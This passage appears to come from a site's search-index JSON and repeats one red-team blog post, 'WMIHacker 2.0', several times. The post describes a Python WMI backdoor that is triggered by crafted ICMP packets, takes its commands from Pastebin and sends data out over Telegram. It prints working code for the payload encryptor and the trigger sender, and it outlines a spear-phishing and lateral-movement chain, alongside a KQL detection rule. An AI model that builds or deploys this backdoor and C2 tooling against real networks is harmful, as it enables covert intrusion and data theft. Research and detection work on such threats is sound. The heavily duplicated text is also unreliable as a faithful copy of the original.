used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\n![PoC TG]\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed 